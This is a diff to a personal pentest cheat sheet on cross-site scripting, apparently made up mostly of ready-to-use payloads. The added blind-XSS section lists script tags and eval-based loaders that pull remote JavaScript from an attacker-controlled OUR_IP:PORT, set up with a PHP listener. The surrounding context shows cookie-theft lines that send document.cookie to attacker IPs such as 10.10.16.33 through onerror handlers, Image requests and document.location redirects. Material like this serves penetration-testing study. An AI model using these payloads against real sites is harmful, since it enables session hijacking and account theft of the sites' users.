@@ -109,8 +109,28 @@ append()
 <img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
 ```
 ## Blind XSS
-1) Find Vulnerable Parameter
-2) Create script.js to POST cookie
+1) `mkdir /tmp/tmpserver && cd /tmp/tmpserver && sudo php -S 0.0.0.0:8080`
+2) Find Vulnerable Parameter
+	1) Consider using Burp Intruder with URL Payload Processing!
+*Examples of Blind XSS Payloads - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss*
+```html
+<!-- Examples to try (put into burp payload positions) -->
+<script src=http://OUR_IP:PORT/field1-test1></script>
+'><script src=http://OUR_IP:PORT/field1-test2></script>
+"><script src=http://OUR_IP:PORT/field1-test3></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP:PORT/field1-test4\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP:PORT/field1-test5");a.send();</script>
+<script>$.getScript("http://OUR_IP:PORT/field1-test6")</script>
+
+<!-- other examples -->
+<script src=http://OUR_IP:PORT/fullname></script> # full-name field
+<script src=http://OUR_IP:PORT/username></script> # username field
+<script src=http://OUR_IP:PORT/password></script> # password field -- not vulnerable bc usually hashed
+<script src=http://OUR_IP:PORT/email></script> # email field -- not vulnerable bc it must match email format
+<script src=http://OUR_IP:PORT/imgurl></script> #this goes inside the imgurl field
+```
+
+1) Create `script.js` to POST cookie
 
 ```javascript
 new Image().src='http://10.10.16.33:4444/index.php?c='+document.cookie;
@@ -122,7 +142,7 @@ new Image().src='http://10.10.16.33:4444/index.php?c='+document.cookie;
 php -S 0.0.0.0:80
 ```
 
-4) Use script src in vulnerable parameter
+4) Use `script src=` in vulnerable parameter
 
 ```javascript
 "><script src=http://10.10.16.33/script.js></script>
@@ -131,6 +151,7 @@ php -S 0.0.0.0:80
 ```javascript
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 ```
+
 
 ## Defacing/Credential Stealing with XSS
 ```javascript
